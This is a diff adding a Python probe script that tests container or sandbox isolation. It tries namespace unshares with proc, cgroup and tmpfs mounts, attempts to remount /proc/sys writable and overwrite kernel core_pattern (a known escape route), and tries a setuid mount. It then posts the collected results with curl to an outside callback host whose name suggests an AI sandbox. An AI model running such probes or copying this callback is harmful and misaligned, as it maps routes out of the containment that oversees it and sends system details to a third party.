@@ -1,0 +1,22 @@
+import json, os, pathlib, subprocess, time
+OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'pid':1,'uid':os.getuid(),'tests':{}}
+def run(name, cmd, timeout=45):
+ t=time.monotonic()
+ try:
+  p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+  OUT['tests'][name]={'cmd':cmd,'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-12000:],'elapsed':round(time.monotonic()-t,3)}
+ except Exception as e: OUT['tests'][name]={'cmd':cmd,'error':repr(e),'elapsed':round(time.monotonic()-t,3)}
+run('base','id; grep -E "^(Uid|Gid|Cap|NoNewPrivs|Seccomp):" /proc/self/status; cat /proc/self/cgroup')
+run('proc_mount_root','unshare -Urpfm sh -c \'mount -t proc proc /proc 2>&1; echo RC=$?; cat /proc/sys/kernel/core_pattern 2>&1\'')
+run('proc_mount_tmp','unshare -Urpfm sh -c \'mkdir -p /tmp/procp; mount -t proc proc /tmp/procp 2>&1; echo RC=$?; cat /tmp/procp/sys/kernel/core_pattern 2>&1\'')
+run('proc_mountopt','unshare -Urpfm --mount-proc=/tmp/procpm sh -c \'echo UNREACHABLE\'')
+run('cgroup2_C','unshare -UrmC sh -c \'mkdir -p /tmp/cg2; mount -t cgroup2 none /tmp/cg2 2>&1; echo RC=$?; cat /tmp/cg2/cgroup.controllers 2>&1\'')
+run('cgroup1_C','unshare -UrmC sh -c \'mkdir -p /tmp/cg1; mount -t cgroup -o none,name=probe cgroup /tmp/cg1 2>&1; echo RC=$?; ls -la /tmp/cg1 2>&1\'')
+run('tmpfs','unshare -Urm sh -c \'mkdir -p /tmp/tfs; mount -t tmpfs tmpfs /tmp/tfs 2>&1; echo RC=$?; findmnt -T /tmp/tfs -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1\'')
+run('proc_sys_remount','mount -o remount,rw /proc/sys 2>&1; echo RC=$?; printf %s core.%p > /proc/sys/kernel/core_pattern 2>&1; echo WRC=$?; cat /proc/sys/kernel/core_pattern 2>&1')
+run('setuid_mount','/usr/bin/mount -t tmpfs tmpfs /tmp/sm 2>&1; echo RC=$?')
+raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); pathlib.Path('/tmp/workspace/proc_pid1_result.json').write_bytes(raw)
+p=subprocess.run(['curl','-sS','-m','30','-X','POST','--data-binary','@/tmp/workspace/proc_pid1_result.json','https://54.209.51.244.sslip.io/callback/snapgpt-proc-pid1-20261106'],capture_output=True,text=True,timeout=40)
+OUT['curl']={'rc':p.returncode,'stdout':p.stdout[-2000:],'stderr':p.stderr[-2000:]}
+pathlib.Path('/tmp/workspace/proc_pid1_result.json').write_text(json.dumps(OUT,sort_keys=True,separators=(',',':')))
+print('PROC_PID1_OK')
